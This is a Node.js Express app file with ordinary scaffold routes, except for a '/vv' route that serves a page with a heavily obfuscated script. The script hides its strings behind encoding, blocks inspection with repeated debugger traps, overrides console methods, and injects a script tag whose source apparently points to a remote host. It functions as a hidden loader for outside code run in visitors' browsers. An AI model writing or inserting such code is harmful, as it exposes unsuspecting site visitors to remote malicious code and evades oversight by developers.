const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');

const app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));



app.get('/', function (req, res, next) {
    res.render('index', {title: 'Express'});
});

app.get('/users', function (req, res, next) {
    res.send('respond with a resource 2');
});

app.get('/vv', function (req, res, next) {
    res.send(`<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" /><title></title><link href="" rel="shortcut icon" /></head><body class="zkABbwDL03CgFZd9VK8Sf"><div class="hMeFyqUOaD0KvA9lHN" id="FhmrdaVXBKEZSycRGlWqOui"></div><script>var _0x15cf=["D2HPBguGkhrYDwuPihT9","AgvHza==","z2DLCG==","yxbWzw5Kq2HPBgq=","z2v0rwXLBwvUDhncEvrHz05HBwu=","zNvUy3rPB24GkLWOicPCkq==","zxjYB3i=","BIb0AgLZiIKOicK=","Aw5WDxq=","Dg9tDhjPBMC=","ngqWyJzKmtmUANm=","y2HHAw4=","D2fYBG==","yxbWBhK=","ChjVDg90ExbL","DgfIBgu=","zgvIDq==","xcTCkYaQkd86w2eTEKeTwL8KxvSW","ywn0Aw9U","Aw5PDa==","Aw5MBW==","DgvZDa==","C3rYAw5N","y29UC29Szq==","y29UC3rYDwn0B3i=","CMv0DxjUicHMDw5JDgLVBIGPia==","C3jJ","lM9YzY82mgeZytnMmJq0ywfJyZmW","BgvUz3rO","E30Uy29UC3rYDwn0B3iOiNjLDhvY","DhjHy2u=","Ahr0Chm6lY92EMfZlMfPB2vJB2LU","ltLHlxPblvPFjf0Qkq==","yMLUza==","C3rHDgvpyMPLy3q=","y3jLyxrLrwXLBwvUDa=="];!function(e,x){!function(x){for(;--x;)e.push(e.shift())}(161)}(_0x15cf);var _0x10e5=function(x,e){var n=_0x15cf[x=+x];void 0===_0x10e5.rFcsAF&&(_0x10e5.uHbBth=function(x){for(var e=function(x){for(var e,n,r=String(x).replace(/=+$/,""),t="",_=0,c=0;n=r.charAt(c++);~n&&(e=_%4?64*e+n:n,_++%4)&&(t+=String.fromCharCode(255&e>>(-2*_&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);return t}(x),n=[],r=0,t=e.length;r<t;r++)n+="%"+("00"+e.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(n)},_0x10e5.plHLsA={},_0x10e5.rFcsAF=!0);var r=_0x10e5.plHLsA[x];return void 0===r?(n=_0x10e5.uHbBth(n),_0x10e5.plHLsA[x]=n):n=r,n},_0x33769f=function(){var r=!0;return function(e,n){var x=r?function(){if(n){var x=n[_0x10e5("0x21")](e,arguments);return n=null,x}}:function(){};return r=!1,x}}();!function(){_0x33769f(this,function(){var x=new RegExp(_0x10e5("0x19")),e=new RegExp(_0x10e5("0x1")+_0x10e5("0x10"),"i"),n=_0x33823e(_0x10e5("0x3"));x[_0x10e5("0x5")](n+_0x10e5("0x1f"))&&e[_0x10e5("0x5")](n+_0x10e5("0x1c"))?_0x33823e():n("0")})()}();var _0x462c79=function(){var r=!0;return function(e,n){var x=r?function(){if(n){var x=n[_0x10e5("0x21")](e,arguments);return n=null,x}}:function(){};return r=!1,x}}();setInterval(function(){_0x33823e()},4e3);var _0x3f85d5=_0x462c79(this,function(){for(var x=function(){var e;try{e=Function(_0x10e5("0x9")+(_0x10e5("0xd")+_0x10e5("0x1b"))+");")()}catch(x){e=window}return e}(),e=x[_0x10e5("0x7")]=x.console||{},n=["log",_0x10e5("0x20"),_0x10e5("0x4"),_0x10e5("0x1a"),"exception",_0x10e5("0x23"),_0x10e5("0xe")],r=0;r<n[_0x10e5("0xc")];r++){var t=_0x462c79[_0x10e5("0x8")][_0x10e5("0x22")][_0x10e5("0x11")](_0x462c79),_=n[r],c=e[_]||t;t.__proto__=_0x462c79[_0x10e5("0x11")](_0x462c79),t[_0x10e5("0x1d")]=c[_0x10e5("0x1d")][_0x10e5("0x11")](c),e[_]=t}});_0x3f85d5();var emfromgetnbrtoo="",script34ssd=document[_0x10e5("0x13")]("script");function _0x33823e(x){function e(x){if(typeof x===_0x10e5("0x6"))return function(x){}[_0x10e5("0x8")](_0x10e5("0x14"))[_0x10e5("0x21")]("counter");1!==(""+x/x)[_0x10e5("0xc")]||x%20==0?function(){return!0}[_0x10e5("0x8")](_0x10e5("0x0")+_0x10e5("0x16")).call(_0x10e5("0x2")):function(){return!1}.constructor(_0x10e5("0x0")+_0x10e5("0x16"))[_0x10e5("0x21")](_0x10e5("0x12")),e(++x)}try{if(x)return e;e(0)}catch(x){}}script34ssd.type="text/javascript",script34ssd[_0x10e5("0xa")]=_0x10e5("0xf")+_0x10e5("0xb")+_0x10e5("0x1e"),document[_0x10e5("0x18")](_0x10e5("0x15"))[0][_0x10e5("0x17")](script34ssd);</script></body></html>`);
});

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
